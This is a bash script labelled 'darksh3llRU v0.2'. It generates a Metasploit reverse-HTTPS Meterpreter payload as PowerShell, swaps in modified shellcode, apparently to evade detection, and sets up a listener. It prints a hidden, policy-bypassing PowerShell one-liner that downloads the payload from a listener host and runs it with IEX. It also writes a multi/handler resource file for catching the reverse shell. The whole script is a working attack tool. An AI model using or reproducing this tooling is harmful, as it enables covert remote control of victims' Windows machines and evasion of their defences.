#!/bin/bash
# shellcode replacement stuff
# darksh3llRU v0.2

# payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
payload="windows/x64/meterpreter/reverse_https"
ListenerIP=192.168.114.26
ListenerPort=8443
ListenerURI="/logout"
ProxyType=HTTP
ProxyHost=""
ProxyPort=""
ProxyUser=""
ProxyPass=""
UserAgent="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
DownloadURL="http://192.168.114.26:8080"

# payload options one liner
payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
printf "Payload and options used:\n$payload\n$payload_options\n...\n"

# generate payload
raw_payload="msfvenom -p $payload $payload_options -f psh-net -o raw_pshnet_revhttps.ps1"
printf "Generating payload:\n$raw_payload\n...\n"
$raw_payload
printf "Payload generated:\n...\n"

# raw payload usage
printf "Raw psh-net usage example:\n"
printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/raw_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"

# extract base64 encoded string, decode, convert to binary format for the future update
# n00b dirty way: cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g'
printf "Extracting, decoding and converting shellcode:\n...\n"
cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g' > raw_pshnet_revhttps.base64.txt
base64 -d raw_pshnet_revhttps.base64.txt | xxd -p | tr -d '\n'  > raw_pshnet_revhttps.hex.txt

printf "Original shellcode raw_pshnet_revhttps.hex.txt, modify and put into the file eleet_pshnet_revhttps.hex.txt\n"

# shellcode modification section
printf "There should be some input waiting stuff to proceed with converting, encoding...\n"
# n00b shellcode copy paste -> emulation for shellcode modification !!!SWITCH OFF FOR REAL!!!
cp raw_pshnet_revhttps.hex.txt eleet_pshnet_revhttps.hex.txt
read -p "Press any key to continue when modified shellcode file is ready..." -n1 -s

# base64 encode the shellcode and put it into ps file
printf "\nStarting converting, encoding and updating ps1 file process...\n"
xxd -p -r eleet_pshnet_revhttps.hex.txt | base64 | tr -d '\n' > eleet_pshnet_revhttps.base64.txt
# prepare to shellcode change
raw_shellcode=$(<raw_pshnet_revhttps.base64.txt)
eleet_shellcode=$(<eleet_pshnet_revhttps.base64.txt)
printf "Old shellcode:\n$raw_shellcode"
printf "\nNew shellcode:\n$eleet_shellcode"
# make a backup of the original file and perform sed on the new file
cp raw_pshnet_revhttps.ps1 eleet_pshnet_revhttps.ps1
sed -i "s,$raw_shellcode,$eleet_shellcode,g" eleet_pshnet_revhttps.ps1
printf "\nShellcode replacement done! eleet psh-net usage example:\n"
printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/eleet_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"

# create multu handler listener file
printf "Creating multi handler script file...\n"
printf "use exploit/multi/handler\n" > multihandler.rc
printf "set PAYLOAD $payload\n" >> multihandler.rc
printf "set LHOST $ListenerIP\n" >> multihandler.rc
printf "set LPORT $ListenerPort\n" >> multihandler.rc
printf "set LURI $ListenerURI\n" >> multihandler.rc
printf "set HttpProxyType $ProxyType\n" >> multihandler.rc
printf "set HttpProxyHost $ProxyHost\n" >> multihandler.rc
printf "set HttpProxyPort $ProxyPort\n" >> multihandler.rc
printf "set HttpProxyUser $ProxyUser\n" >> multihandler.rc
printf "set HttpProxyPass $ProxyPass\n" >> multihandler.rc
printf "set HttpUserAgent $UserAgent\n" >> multihandler.rc
printf "exploit -j -z\n" >> multihandler.rc
printf "Run listener: msfconsole -r multihandler.rc\n"



